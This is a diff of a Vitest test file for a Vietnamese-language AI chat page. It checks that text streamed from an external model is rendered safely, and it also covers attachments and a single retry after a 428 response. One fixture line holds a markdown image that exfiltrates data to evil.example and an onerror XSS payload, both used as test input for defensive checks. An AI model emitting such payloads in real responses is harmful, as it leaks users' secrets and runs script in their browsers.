@@ -22,12 +22,15 @@ const H = vi.hoisted(() => ({
   loi: { current: null as unknown },
   tinNhan: [] as unknown[],
   refetch: vi.fn(),
+  toastError: vi.fn(),
+  search: "q=hoi%20gi%20do",
+  stream: { text: "", dang: false },
 }));
 
-vi.mock("sonner", () => ({ toast: { error: vi.fn(), success: vi.fn(), warning: vi.fn(), info: vi.fn() } }));
+vi.mock("sonner", () => ({ toast: { error: (...a: unknown[]) => H.toastError(...a), success: vi.fn(), warning: vi.fn(), info: vi.fn() } }));
 vi.mock("@/_core/hooks/useAuth", () => ({ useAuth: () => ({ user: { id: 1, role: "admin", name: "T" } }) }));
 vi.mock("@/contexts/AiCopilotContext", () => ({ useAiCopilotContext: () => ({ selection: {}, publishPrefill: () => undefined }) }));
-vi.mock("wouter", () => ({ useLocation: () => ["/ai-chat", () => undefined], useSearch: () => "q=hoi%20gi%20do" }));
+vi.mock("wouter", () => ({ useLocation: () => ["/ai-chat", () => undefined], useSearch: () => H.search }));
 vi.mock("@/components/DashboardLayout", () => ({ default: ({ children }: { children: unknown }) => <main>{children as never}</main> }));
 vi.mock("@/components/ai/ChonModel", () => ({ default: () => null }));
 vi.mock("@/components/AIGuidedActionCards", () => ({ default: () => null }));
@@ -38,8 +41,8 @@ vi.mock("@/hooks/useKbChatStream", async (orig) => {
   return {
     ...real,
     useKbChatStream: () => ({
-      streamingText: "",
-      isStreaming: false,
+      streamingText: H.stream.text,
+      isStreaming: H.stream.dang,
       error: null,
       loiNgoai: null,
       loiNgoaiRef: H.loi,
@@ -100,6 +103,9 @@ beforeEach(() => {
   H.save.mockReset();
   H.chat.mockReset();
   H.refetch.mockReset();
+  H.toastError.mockReset();
+  H.search = "q=hoi%20gi%20do";
+  H.stream = { text: "", dang: false };
   H.loi.current = null;
   H.tinNhan = [];
   localStorage.clear();
@@ -179,6 +185,7 @@ describe("AIChatPage — model ngoài", () => {
     expect(screen.getByTestId("huy-hieu-ngoai").className).toContain("text-red-700");
     expect(H.chat).not.toHaveBeenCalled();
     expect(H.save).not.toHaveBeenCalled();
+    expect((screen.getByPlaceholderText(/Hỏi bất cứ điều gì/i) as HTMLInputElement).value).toBe("hoi gi do"); // câu hỏi trả về ô nhập để thử lại/đổi model
   });
 
   it("model cục bộ: KHÔNG conversationId/xacNhanVanHanh, KHÔNG ngoaiCallId; lỗi stream vẫn rơi sang chat như cũ", async () => {
@@ -206,5 +213,81 @@ describe("AIChatPage — model ngoài", () => {
     expect(await screen.findByTestId("noi-dung-tra-loi-ngoai")).toBeInTheDocument();
     expect(screen.getByTestId("nhan-ngoai").textContent).toContain("anthropic");
     expect(container.querySelector("main a[href], main img")).toBeNull();
+  });
+});
+
+describe("AIChatPage — model ngoài: các cửa còn lại (kiem-dinh L1)", () => {
+  const nap = () => {
+    localStorage.setItem("aiChon.chat", MA);
+    sessionStorage.setItem("aiNgoai.xacNhanVanHanh", JSON.stringify(["7|anthropic:claude-x"]));
+  };
+  const DOC = "Xin chào ![x](http://evil.example/leak?d=SECRET) [bấm](http://evil.example/a) <img src=x onerror=alert(1)>";
+
+  it("văn bản ĐANG HIỆN của lượt ngoài đi qua bộ render an toàn: 0 <img>/<a href>, 0 fetch/Image; đối chứng lượt cục bộ vẫn là Markdown", async () => {
+    const fetchSpy = vi.fn(async () => new Response("{}"));
+    const anh: string[] = [];
+    const GocImage = globalThis.Image;
+    vi.stubGlobal("fetch", fetchSpy);
+    vi.stubGlobal("Image", class { set src(v: string) { anh.push(v); } });
+    try {
+      nap();
+      H.stream = { text: DOC, dang: true };
+      H.start.mockImplementation(() => new Promise(() => undefined)); // lượt còn đang chạy
+      const { container, unmount } = render(<AIChatPage />);
+      await waitFor(() => expect(H.start).toHaveBeenCalledTimes(1));
+      const kh = await screen.findByTestId("noi-dung-tra-loi-ngoai");
+      expect(kh.textContent).toContain("Xin chào");
+      expect(container.querySelectorAll("main img, main a[href]").length).toBe(0);
+      expect(fetchSpy).not.toHaveBeenCalled();
+      expect(anh).toEqual([]);
+      unmount();
+      cleanup();
+      // đối chứng: lượt cục bộ ⇒ Markdown thường (có <img>) — phép thử không rỗng
+      localStorage.clear();
+      sessionStorage.clear();
+      H.start.mockReset();
+      H.start.mockImplementation(() => new Promise(() => undefined));
+      const loc = render(<AIChatPage />);
+      await waitFor(() => expect(H.start).toHaveBeenCalledTimes(1));
+      await waitFor(() => expect(loc.container.querySelectorAll("main img").length).toBe(1));
+      expect(screen.queryByTestId("noi-dung-tra-loi-ngoai")).toBeNull();
+    } finally {
+      vi.unstubAllGlobals();
+      globalThis.Image = GocImage;
+    }
+  });
+
+  it("đính kèm ảnh khi chọn model ngoài ⇒ toast, KHÔNG gọi startKbStream, ô nhập giữ nguyên", async () => {
+    nap();
+    H.search = "";
+    const { container } = render(<AIChatPage />);
+    const file = new File([new Uint8Array([137, 80, 78, 71])], "a.png", { type: "image/png" });
+    const input = container.querySelector('input[type="file"]') as HTMLInputElement;
+    fireEvent.change(input, { target: { files: [file] } });
+    await waitFor(() => expect(container.querySelector("img")).not.toBeNull());
+    const o = screen.getByPlaceholderText(/Hỏi bất cứ điều gì/i) as HTMLInputElement;
+    fireEvent.change(o, { target: { value: "câu có ảnh" } });
+    fireEvent.keyDown(o, { key: "Enter" });
+    await waitFor(() => expect(H.toastError).toHaveBeenCalledTimes(1));
+    expect(H.toastError.mock.calls[0]![0]).toContain("đính kèm");
+    expect(H.start).not.toHaveBeenCalled();
+    expect(o.value).toBe("câu có ảnh");
+  });
+
+  it("máy chủ trả 428 cả SAU khi đã xác nhận ⇒ gửi lại đúng MỘT lần, không hỏi lần hai, không vòng; câu hỏi trả về ô nhập", async () => {
+    localStorage.setItem("aiChon.chat", MA);
+    H.start.mockImplementation(async () => {
+      H.loi.current = loi428();
+      return null;
+    });
+    render(<AIChatPage />);
+    fireEvent.click(await screen.findByTestId("xnvh-dong-y"));
+    await waitFor(() => expect(H.start).toHaveBeenCalledTimes(2));
+    await new Promise((r) => setTimeout(r, 50));
+    expect(H.start).toHaveBeenCalledTimes(2);
+    expect(screen.queryByTestId("hop-xac-nhan-van-hanh")).toBeNull();
+    expect(H.chat).not.toHaveBeenCalled();
+    expect(H.save).not.toHaveBeenCalled();
+    expect((screen.getByPlaceholderText(/Hỏi bất cứ điều gì/i) as HTMLInputElement).value).toBe("hoi gi do");
   });
 });
